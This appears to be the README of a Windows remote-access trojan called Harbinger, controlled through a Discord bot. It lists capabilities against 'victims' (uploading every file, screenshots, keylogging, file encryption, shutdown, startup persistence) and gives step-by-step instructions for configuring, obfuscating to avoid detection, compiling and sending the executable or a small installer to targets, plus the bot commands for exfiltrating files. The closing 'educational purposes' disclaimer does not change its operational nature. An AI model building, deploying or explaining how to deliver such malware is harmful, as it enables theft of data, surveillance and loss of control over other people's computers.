# Harbinger

A botnet system (basic) based on Discord. As of now, it isn't really a botnet, but in the future, given that enough people support this, I'll add in actual botnet features.

## A Quick Overview

This is a very crude botnet script. Its command center is based on a Discord server (will be explained later).

*(Just a quick side note - this usage and installation guide is exclusive to Windows; the software will also only work on Windows targets.)*

## Functionality

Here's what most of you guys are probably most interested in; it can:

- Upload every file from a victim machine to a Discord server.
- Send screenshots of a victim machine.
- Get basic internet info: Public IP, Geolocation (this won't be very accurate - I apologize for this in advance), ISP, Verification whether the victim is a proxy or on a hosting service.
- Remote Shutdown (just for fun).
- Keylogging (based on an older repository of mine).
- System info: CPU info, Memory info, Disk info, Internet info (interface info).
- Self-Destruct: This is a feature that is very buggy; it rarely works.
- File encryption: Give a password and a directory, and every single file that can be encrypted in that directory will be using XOR encryption (this isn't the best possible way of doing this by far, but the executable file size of this is already quite big).
- File decryption, just reverses the encryption of the file - but you will need that password you set when encrypting.
- It has persistence, and automatically adds itself to windows startup. 

As of right now, that's all of the features this thing has. Not a lot - I know.

## Necessary Things

To actually edit this script as needed and compile it into an executable, you will need the following:
- Python - if you don't have it already, install it [here](https://www.python.org/downloads/windows/).
- Once you have installed Python, run this command in cmd (also known as command prompt) or powershell: `pip install pyinstaller`. This will be necessary for converting the scripts into executable files.
- Also, run the command: `pip install pyminifier`. This will be necessary for preventing detection of the payload. If you get any errors when installing, check [here](https://github.com/MalwareMakers/Python-Botnet/blob/main/Other-md-files/Pyminifier-issues.md).
- Now clone the repository and extract it from the zip-file.
- Navigate to where you saved the repository in cmd/powershell and use the command: `pip install -r requirements.txt`, this will install all of the necessary modules.

## Post-Preparations

There are a few things you will need to set up to make this work:

1. Activate developer mode on Discord: If you need help with this, go [here](https://beebom.com/how-enable-disable-developer-mode-discord/).
2. Make a new server (unless you want others to see the info) and create a new channel. If you turned developer mode on, when you right-click on the channel you want to use, it will show an option to `Copy Channel ID`. Click on this and save the ID somewhere you can retrieve it later.
3. Create a Discord bot at the official Discord application maker portal: [here](https://discord.com/developers/applications). Once you have made a new bot, copy the bot token to a place where you can retrieve it later.
4. Also, in the Discord server, create a new webhook to be used and save the URL to be used in the next step.

## Preparation

1. Now open up the Harbringer.py file, edit the following variables: `TOKEN = "<Add your bot token here>"`, `CHANNEL_ID = "<Add your channel ID here>"`, `webhook_url = "<Add your webhook here>"`; these should now have the correct values in the Harbringer.py file.
2. Now open a powershell or cmd terminal where you have saved the Harbringer.py file and run this command: `pyinstaller Harbringer.py --onefile --noconsole` to create the executable file. This will be stored in a folder called "dist" that will be created when the command is run.
3. You can send this executable file to anyone and when they run it on a windows machine, that machine will be your to command. 

## Extras: 

First of all, the executable file made has a size of 28mb. This is too big for conventional ways of sending a file to a victim, discord; gmail etc. Thats why we have the Installer.py script. It is a tiny file which can be sent to a victim machine, and then install our software. But like before we need to set it up. If you want to make sure ur victim gets the software the go [here](https://github.com/MalwareMakers/Python-Botnet/blob/main/Other-md-files/Installer-Setup.md) for a full guide

## How do you use it? 

There a several commands which can be used, you will need to send this in whatever channel in the server you have setup to be connect to the bot: 

* `/mass-upload` - starts uploading every viable file on a victims computer to the server. 
* `/screen-update` - sends screenshot of victims screen to the server
* `/quick-info` - gathers info based on ip-api
* `/shutdown` - shutsdown victims computer
* `/keylogger` - starts a keylogger
* `/hunt` - finds specified files you set and if found uploads them, ie: `/hunt example.docx`
* `/kill` - This is a broken feature as of now, I will be patching this. (It is meant to delete itself but it wont work)
* `/system-info` - Shows info about the victims pc.
* `/help` - Brings up a help menue with all the commands and their functions. 

## Find a Bug? 

If you have found a bug in the code, use the issue tab above. If you would like to submit a PR with a fix, reference the issue you are fixing. If you are looking for new features, use the suggestion function in the issues tab above to do so. 

## LICENCE: 

This project has been Licenced under the GNU Affero General Public License v3.0. It can be found at [LICENCE]([LICENSE](https://github.com/MalwareMakers/Python-Botnet/blob/main/LICENSE))

## Legality:

This was a program designed for educational purposes only. I do not accept any responsiblity for the usage of the software for illegal or malicious purposes, nor do I condone it.  
